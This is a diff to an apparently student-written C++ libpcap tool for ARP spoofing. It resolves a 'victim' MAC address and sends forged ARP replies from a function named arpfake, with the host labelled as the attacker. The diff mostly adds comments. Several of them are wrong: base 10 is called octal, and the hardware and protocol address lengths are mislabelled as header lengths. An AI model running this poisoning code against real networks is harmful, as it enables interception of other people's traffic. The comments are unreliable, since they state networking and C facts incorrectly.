@@ -16,6 +16,7 @@ using namespace std;
 //sender_MAC : victim
 //sender_IP : victim
 //host_MAC : host
+//arp packet size : 42
 
 //struct arp_pckt > arp_request, arp_reply_packet
 typedef struct
@@ -43,7 +44,7 @@ int main(int argc, char **argv)
         }
 
         /* Open the output device */
-        fp = pcap_open_live(argv[1], 42, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf);
+        fp = pcap_open_live(argv[1], 42, 0, 1000, errbuf);
         if(fp == NULL)
         {
             return -1;
@@ -66,7 +67,7 @@ void getsender_mac(pcap_t *fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t*
 
     for (int i=0;i<6;i++)
     {
-         arp_request.ethhdr.ether_dhost[i]=0xff;
+         arp_request.ethhdr.ether_dhost[i]=0xff; //broadcast FF:FF:FF:FF:FF:FF
          arp_request.ethhdr.ether_shost[i]=host_MAC[i];
     }
 
@@ -74,14 +75,14 @@ void getsender_mac(pcap_t *fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t*
     arp_request.ethhdr.ether_type = htons(ETH_P_ARP); //htons must be use it !!!
     arp_request.arphdr.ea_hdr.ar_hrd= htons(ARPHRD_ETHER); //htons must be use it !!!
     arp_request.arphdr.ea_hdr.ar_pro = htons(ETH_P_IP); //htons must be use it !!!
-    arp_request.arphdr.ea_hdr.ar_hln = 0x06;
-    arp_request.arphdr.ea_hdr.ar_pln = 0x04;
+    arp_request.arphdr.ea_hdr.ar_hln = 0x06; //header length
+    arp_request.arphdr.ea_hdr.ar_pln = 0x04; //protocol length
     arp_request.arphdr.ea_hdr.ar_op = htons(ARPOP_REQUEST); //htons must be use it !!!
 
-    memcpy(&arp_request.arphdr.arp_sha, host_MAC, 6);
-    memset(&arp_request.arphdr.arp_tha, 0, 6);
-    memset(&arp_request.arphdr.arp_spa, 0, 4); //source
-    memcpy(&arp_request.arphdr.arp_tpa, sender_IP, 4); //target
+    memcpy(&arp_request.arphdr.arp_sha, host_MAC, 6); //source header address > MAC
+    memset(&arp_request.arphdr.arp_tha, 0, 6); //target header address > Mac
+    memset(&arp_request.arphdr.arp_spa, 0, 4); //source protocol address > IP, We Don't know 'source port address'
+    memcpy(&arp_request.arphdr.arp_tpa, sender_IP, 4); //target protocol address > IP
 
     u_char arp_send_packet[42];
     memcpy(arp_send_packet, &arp_request, sizeof (arp_request));
@@ -95,12 +96,15 @@ void getsender_mac(pcap_t *fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t*
       if (res == 0) continue;
       if (res == -1 || res == -2) break;
 
+      //verify code
       arp_reply_packet = reinterpret_cast<arp_pckt*>(const_cast<u_char*>(packet));
+      //ethernet type != 0x0806?
       if (arp_reply_packet->ethhdr.ether_type != htons(ETH_P_ARP)) {
           continue;
       }
       bool isok = true;
       for (int i=0;i<4;i++) {
+          //arp target protocol address(IP) != arp source protocol address(IP)?
           if(arp_request.arphdr.arp_tpa[i] != arp_reply_packet->arphdr.arp_spa[i])
           {
               isok = false;
@@ -122,13 +126,13 @@ void str_to_IP(char* argv, uint8_t* IP){
     int i=0;
     while (p != NULL)
     {
-        IP[i] = strtol(p,nullptr,10); //string to long
+        IP[i] = strtol(p,nullptr,10); //string to long, 10 mean = octal number
         p = strtok(NULL,"."); // string tokenize
         i++;
     }
 }
 
-//host_mac copy code
+//get attacker mac
 void get_host_mac(uint8_t* MAC_str, char* dev)
 {
     struct ifreq s;
@@ -158,8 +162,8 @@ void arpfake(pcap_t *fp, uint8_t* sender_MAC, uint8_t* host_MAC, uint8_t* target
     arp_reply.ethhdr.ether_type = htons(ETH_P_ARP); //htons must be use it !!!
     arp_reply.arphdr.ea_hdr.ar_hrd= htons(ARPHRD_ETHER); //htons must be use it !!!
     arp_reply.arphdr.ea_hdr.ar_pro = htons(ETH_P_IP); //htons must be use it !!!
-    arp_reply.arphdr.ea_hdr.ar_hln = 0x06;
-    arp_reply.arphdr.ea_hdr.ar_pln = 0x04;
+    arp_reply.arphdr.ea_hdr.ar_hln = 0x06; //header length
+    arp_reply.arphdr.ea_hdr.ar_pln = 0x04; //protocol length
     arp_reply.arphdr.ea_hdr.ar_op = htons(ARPOP_REPLY); //htons must be use it !!!
 
     memcpy(&arp_reply.arphdr.arp_sha, host_MAC, 6);
